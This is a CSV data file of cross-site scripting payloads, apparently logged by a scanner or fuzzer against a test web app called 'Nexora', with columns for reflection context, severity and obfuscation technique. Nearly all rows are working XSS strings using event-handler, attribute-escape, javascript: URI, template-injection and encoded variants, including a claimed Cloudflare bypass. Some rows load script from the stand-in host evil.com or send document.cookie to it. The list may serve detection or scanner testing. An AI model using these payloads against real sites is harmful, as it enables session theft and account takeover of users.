payload,payload_with_context,context,severity,source,sink,reflection_position,technique
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute_escape,high,,,attribute,original
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,"<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""<body onunhandled]",tag_injection,high,,,attribute,none
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,low,,,script,original
-alert(1)-',-alert(1)-' [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:-alert(1)-'</code],tag_injection,medium,,,attribute,none
<img src/onerror=prompt(8)>,<img src/onerror=prompt(8)> [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '<img src/onerror=],tag_injection,medium,,,script,none
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",attribute_escape,medium,,,html_body,original
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">""><img src=x oner]",tag_injection,high,,,html_body,encoding
location='javaScriPt:alert\x2845\x29',location='javaScriPt:alert\x2845\x29' [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'location='javaScr],script_injection,high,,,script,none
<img src/onerror=prompt(8)>,<img src/onerror=prompt(8)> [position:dom snippet_context:8],tag_injection,medium,,,dom,none
<audio src/onerror=alert(1)>,"<audio src/onerror=alert(1)> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<audio src/onerror=alert(]",tag_injection,medium,,,attribute,none
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:script snippet_context:...iv class=""post-meta""><span class=""post-author"">testuser</span></div> <div>alert(String.fromCharCo]",tag_injection,high,,,script,encoding
"document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>""","document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>"" [position:script]",dom_sink,medium,,,script,obfuscated:tab_newline_inject
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">""><img src=x onerror=]",tag_injection,high,,,html_body,encoding
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,low,,,html_body,mutated
javascript:alert(1),javascript:alert(1) [position:attribute],attribute_escape,low,,,attribute,original
alert(String.fromCharCode(88))</SCRIPT>,"alert(String.fromCharCode(88))</SCRIPT> [position:attribute snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""alert(String.from]",tag_injection,high,,,attribute,encoding
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--","confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""confirm(String.fr]",tag_injection,high,,,attribute,encoding
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background://"";alert(String.]",tag_injection,high,,,attribute,encoding
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><svg onload=""conf]",tag_injection,medium,,,html_body,none
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">window[""ev"".conca]",tag_injection,high,,,attribute,encoding
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:html_body snippet_context:;alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</]",tag_injection,high,,,html_body,encoding|case_variation
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
<svg><a onload=alert(1)></a>,"<svg><a onload=alert(1)></a> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=<svg><a onload=alert(1)></a>"">]",tag_injection,medium,,,attribute,none
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--","alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:alert(String.from]",tag_injection,high,,,attribute,encoding
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:style]",attribute_escape,high,,,style,mutated
innerHTML=location.hash>#<script>self.alert(1)</script>,"innerHTML=location.hash>#<script>self.alert(1)</script> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:innerHTML=locatio]",tag_injection,high,,,attribute,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,original
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",""" oNfOcUs=aLeRt(1) AuToFoCuS="" [position:attribute]",attribute_escape,high,,,attribute,obfuscated:mixed_case
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:comment],attribute_escape,medium,,,comment,none
"setTimeout(	""alert(	1)"",0)","setTimeout(	""alert(	1)"",0) [position:script]",dom_sink,high,,,script,obfuscated:tab_newline_inject
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",js_uri,high,,,script,original
"""\x3e\x3cimg src=x onerror=alert(1)\x3e","""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:attribute]",attribute_escape,low,,,attribute,obfuscated:hex_escape
%20javascript:alert(1),"%20javascript:alert(1) [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""%20javascript:alert(1)"" style=""c]",js_uri,medium,,,attribute,url_encoding
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:style]",attribute_escape,high,,,style,mutated
{{7*7}},{{7*7}} [position:script],script_injection,low,,,script,mutated
<%= aLeRt(1) %>,<%= aLeRt(1) %> [position:script],script_injection,high,,,script,obfuscated:mixed_case
<SCRIPT src=//evil.com/xss.js></SCRIPT>,<SCRIPT src=//evil.com/xss.js></SCRIPT> [position:script],script_injection,low,,,script,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,medium,,,html_body,original
onerror='alert(1)',"onerror='alert(1)' [position:html_body snippet_context:onerror='alert(1)'({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));","//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); [position:html_body snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color://--></SCRIPT><SC]",tag_injection,high,,,html_body,encoding|case_variation
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",event_handler,medium,,,html_body,original
;alert(1);,";alert(1); [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=;alert(1);""> <link rel=""styles]",tag_injection,medium,,,attribute,none
<marquee onstart=al'+'ert(1)>,<marquee onstart=al'+'ert(1)> [position:none],event_handler,medium,,,none,obfuscated:concat_split
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:none],event_handler,high,,,none,original
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""innerHTML=location.hash>#]",tag_injection,high,,,attribute,none
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",template_injection,low,,,html_body,original
"<img src
=x onerror
=alert(	1)>","<img src
=x onerror
=alert(	1)> [position:script]",script_injection,high,,,script,obfuscated:tab_newline_inject
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute_escape,low,,,attribute,original
<img/src=x onerror=\u0061\u006cert(1)//>,<img/src=x onerror=\u0061\u006cert(1)//> [position:attribute],event_handler,high,,,attribute,obfuscated:unicode_escape
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,high,,,html_body,original
<svgonload=alert(1)>,<svgonload=alert(1)> [position:html_body snippet_context:...<section class=blog-header> <h1>0 search results for '<svg onload = alert(1) >'</h1> <hr> </secti],tag_injection,medium,,,html_body,none
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,"<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<body onunhandled]",tag_injection,high,,,attribute,none
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:script],js_uri,low,,,script,obfuscated:tab_newline_inject
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,original
' ><img src=x onload=alert(1)>,' ><img src=x onload=alert(1)> [position:attribute],attribute_escape,medium,,,attribute,mutated
onerror=”alert(‘AnonKryptiQuz’),onerror=”alert(‘AnonKryptiQuz’) [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'onerror=”alert(‘A],tag_injection,medium,,,script,none
%3Cimg/src=%3Dx+onload=alert(2)%3D,%3Cimg/src=%3Dx+onload=alert(2)%3D [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '%3Cimg/src=%3Dx+o],tag_injection,medium,,,script,url_encoding
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:attribute]",template_injection,high,,,attribute,mutated
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('</SCRIPT>"">'><SCR]",tag_injection,high,,,attribute,encoding|case_variation
<script ^__^>alert(String.fromCharCode(49))</script ^__^,"<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:<script ^__^>aler]",tag_injection,high,,,attribute,encoding
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
<script ^__^>alert(String.fromCharCode(49))</script ^__^,"<script ^__^>alert(String.fromCharCode(49))</script ^__^ [position:attribute snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""<script ^__^>aler]",tag_injection,high,,,attribute,encoding
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:<img src=asdf one]",tag_injection,high,,,attribute,none
<%= alert(1) %>,<%= alert(1) %> [position:attribute],event_handler,low,,,attribute,mutated
${alert(1)},${alert(1)} [position:script],template_injection,low,,,script,mutated
<;BODY ONLOAD=alert(';XSS';)>;,"<;BODY ONLOAD=alert(';XSS';)>; [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<;BODY ONLOAD=alert(';XSS]",tag_injection,medium,,,attribute,none
&quot; onerror=confirm(1) x=&quot;,&quot; onerror=confirm(1) x=&quot; [position:script],attribute_escape,high,,,script,mutated
confirm(),"confirm() [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('confirm()')""</cod]",tag_injection,medium,,,attribute,none
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>","""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script> [position:dom snippet_context:BlAcKIce]",tag_injection,high,,,dom,encoding
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>","<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))> [position:dom snippet_context:Cloudflare Bypassed :)]",tag_injection,high,,,dom,encoding|case_variation
%3Cscript%3Econfirm(1)%3C/script%3E,%3Cscript%3Econfirm(1)%3C/script%3E [position:script],script_injection,high,,,script,obfuscated:url_encode
\' onerror=alert(1)//,\' onerror=alert(1)// [position:none],attribute_escape,medium,,,none,obfuscated:url_encode
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,low,,,attribute,original
innerHTML=location.hash>#<script>confirm(1)</script>,innerHTML=location.hash>#<script>confirm(1)</script> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:innerHTML=locatio],tag_injection,high,,,attribute,mutated
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:""></SCRIPT>”>’><S]",tag_injection,high,,,attribute,encoding|case_variation
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],event_handler,high,,,script,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,high,,,attribute,mutated
"onerror=""top.alert(1)""","onerror=""top.alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
"%20""><svg onload=alert(1)>","%20""><svg onload=alert(1)> [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""%20""><svg onload=]",tag_injection,medium,,,script,url_encoding
alert(2),"alert(2) [position:html_body snippet_context:alert(2)({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"""><svg onload=alert()>","""><svg onload=alert()> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid ""><svg onload=ale]",tag_injection,medium,,,attribute,none
<svg src=x onerror=alert(1)>,<svg src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,mutated
'});alert(document.cookie);//','});alert(document.cookie);//' [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = ''});alert(documen],script_injection,high,,,script,none
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
#{alert(1)},#{alert(1)} [position:attribute],template_injection,high,,,attribute,obfuscated:html_entity
嘼img src=1 onerror=alert(1)嘾,嘼img src=1 onerror=alert(1)嘾 [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid 嘼img src=1 onerro],tag_injection,medium,,,attribute,none
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,mutated
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:script]",dom_sink,low,,,script,original
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:none]",attribute_escape,low,,,none,obfuscated:unicode_escape
javascr/**/ipt:confirm(1),javascr/**/ipt:confirm(1) [position:script],js_uri,low,,,script,obfuscated:comment_inject
onwheel='alert(1)',onwheel='alert(1)' [position:html_body],tag_injection,medium,,,html_body,mutated
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
"""><svg
 onload=alert()>","""><svg
 onload=alert()> [position:script snippet_context:...bject literal.</p> <h2>Multi-Param Reflection</h2> <p>a = </p><p>b = </p><p>c = ""><svg onload=ale]",tag_injection,medium,,,script,mutated
"mrco24""type=image src onerror=""alert(1)""","mrco24""type=image src onerror=""alert(1)"" [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:mrco24""type=image]",tag_injection,medium,,,attribute,none
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""//"";alert(String.fromChar]",tag_injection,high,,,attribute,encoding
